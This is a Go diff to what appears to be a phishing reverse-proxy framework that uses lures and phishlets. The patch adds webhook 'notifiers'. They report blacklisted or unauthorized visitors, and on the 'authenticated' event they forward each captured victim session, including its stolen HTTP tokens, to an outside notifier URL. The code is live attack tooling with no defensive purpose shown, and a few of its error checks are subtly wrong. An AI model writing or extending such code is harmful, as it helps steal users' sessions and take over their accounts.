@@ -149,6 +149,17 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			ctx.UserData = ps
 			hiblue := color.New(color.FgHiBlue)
 
+			req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path
+			o_host := req.Host
+			lure_url := req_url
+			req_path := req.URL.Path
+			if req.URL.RawQuery != "" {
+				req_url += "?" + req.URL.RawQuery
+				//req_path += "?" + req.URL.RawQuery
+			}
+
+			//log.Debug("http: %s", req_url)
+
 			// handle ip blacklist
 			from_ip := req.RemoteAddr
 			if strings.Contains(from_ip, ":") {
@@ -159,10 +170,30 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					if p.bl.IsVerbose() {
 						log.Warning("blacklist: request from ip address '%s' was blocked", from_ip)
 					}
+					for _, n := range p.cfg.notifiers {
+						if n.OnEvent == "blacklist_visit" && n.Enabled {
+							log.Info("forwarding blacklisted ip to notifier url %s ", n.Url)
+							err := NotifyOnBlacklistVisit(n, req_url, req.Header.Get("User-Agent"), from_ip)
+							if err != nil {
+								log.Error("notifier: %v", err)
+							}
+						}
+					}
 					return p.blockRequest(req)
 				}
+
 				if p.cfg.GetBlacklistMode() == "all" {
 					err := p.bl.AddIP(from_ip)
+					for _, n := range p.cfg.notifiers {
+						if n.OnEvent == "blacklist_add" && n.Enabled {
+							log.Info("forwarding blacklisted ip to notifier url %s ", n.Url)
+							NotifyOnBlacklistAddAll(n, req_url, req.Header.Get("User-Agent"), from_ip)
+							if err != nil {
+								log.Error("notifier: %v", err)
+							}
+						}
+					}
+
 					if p.bl.IsVerbose() {
 						if err != nil {
 							log.Error("failed to blacklist ip address: %s - %s", from_ip, err)
@@ -175,16 +206,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 			}
 
-			req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path
-			o_host := req.Host
-			lure_url := req_url
-			req_path := req.URL.Path
-			if req.URL.RawQuery != "" {
-				req_url += "?" + req.URL.RawQuery
-				//req_path += "?" + req.URL.RawQuery
-			}
 
-			//log.Debug("http: %s", req_url)
 
 			parts := strings.SplitN(req.RemoteAddr, ":", 2)
 			remote_addr := parts[0]
@@ -252,9 +274,30 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									if err == nil {
 										if !re.MatchString(req.UserAgent()) {
 											log.Warning("[%s] unauthorized request (user-agent rejected): %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
-
+											for _, n := range p.cfg.notifiers {
+												if n.OnEvent == "unauthorized_user_agent" && n.Enabled {
+													log.Info("[%s] forwarding unauthorized user agent request info to notifier url %s", hiblue.Sprint(pl_name), n.Url)
+													err := NotifyOnUnauthorizedUserAgent(n, pl_name, req_url, req.Header.Get("User-Agent"), remote_addr)
+													if err != nil {
+														log.Error("notifier: %v", err)
+													}
+												}
+											}
 											if p.cfg.GetBlacklistMode() == "unauth" {
 												err := p.bl.AddIP(from_ip)
+												if err != nil {
+													for _, n := range p.cfg.notifiers {
+														if n.OnEvent == "blacklist_add" && n.Enabled {
+															log.Info("[%s] forwarding blacklisted ip to notifier url %s ", hiblue.Sprint(pl_name), n.Url)
+															// todo: update to blacklist add
+															err := NotifyOnBlacklistAddUnauth(n, pl_name, req_url, req.Header.Get("User-Agent"), remote_addr)
+															if err != nil {
+																log.Error("notifier: %v", err)
+															}
+														}
+													}
+												}
+												
 												if p.bl.IsVerbose() {
 													if err != nil {
 														log.Error("failed to blacklist ip address: %s - %s", from_ip, err)
@@ -299,12 +342,44 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									p.whitelistIP(remote_addr, ps.SessionId, pl.Name)
 
 									req_ok = true
+									
+									for _, n := range p.cfg.notifiers {
+										if n.OnEvent == "visitor" && n.Enabled {
+											session, _ := p.db.GetSessionBySid(session.Id)
+											log.Info("[%d] [%s] forwarding visitor info to notifier url %s", sid, hiblue.Sprint(pl_name), n.Url)
+											err := NotifyOnVisitor(n, *session, req.URL)
+											if err != nil {
+												log.Error("notifier: %v", err)
+											}
+										}
+									}
 								}
 							} else {
 								log.Warning("[%s] unauthorized request: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
-
+								
+								for _, n := range p.cfg.notifiers {
+									if n.OnEvent == "unauthorized" && n.Enabled {
+										log.Info("[%s] unauthorized request info to notifier url %s", hiblue.Sprint(pl_name), n.Url)
+										err := NotifyOnUnauthorized(n, pl_name, req_url, req.Header.Get("User-Agent"), remote_addr)
+										if err != nil {
+											log.Error("notifier: %v", err)
+										}
+									}
+								}
+								
 								if p.cfg.GetBlacklistMode() == "unauth" {
 									err := p.bl.AddIP(from_ip)
+									
+									for _, n := range p.cfg.notifiers {
+										if n.OnEvent == "blacklist_add" && n.Enabled {
+											log.Info("[%s] forwarding blacklisted ip to notifier url %s", hiblue.Sprint(pl_name), n.Url)
+											err := NotifyOnBlacklistAddUnauth(n, pl_name, req_url, req.Header.Get("User-Agent"), remote_addr)
+											if err != nil {
+												log.Error("notifier: %v", err)
+											}
+										}
+									}
+
 									if p.bl.IsVerbose() {
 										if err != nil {
 											log.Error("failed to blacklist ip address: %s - %s", from_ip, err)
@@ -313,6 +388,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										}
 									}
 								}
+
 								return p.blockRequest(req)
 							}
 						} else {
@@ -860,6 +936,17 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						if err := p.db.SetSessionHttpTokens(ps.SessionId, s.HttpTokens); err != nil {
 							log.Error("database: %v", err)
 						}
+						for _, n := range p.cfg.notifiers {
+							if n.OnEvent == "authenticated" && n.Enabled {
+								session, _ := p.db.GetSessionBySid(ps.SessionId)
+								log.Info("[%d] forwarding captured session to notifier url %s", ps.Index, n.Url)
+								err := NotifyOnAuth(n, *session, pl)
+								if err != nil {
+									log.Error("notifier: %v", err)
+								}
+							}
+						}
+						
 						s.IsDone = true
 					}
 				}
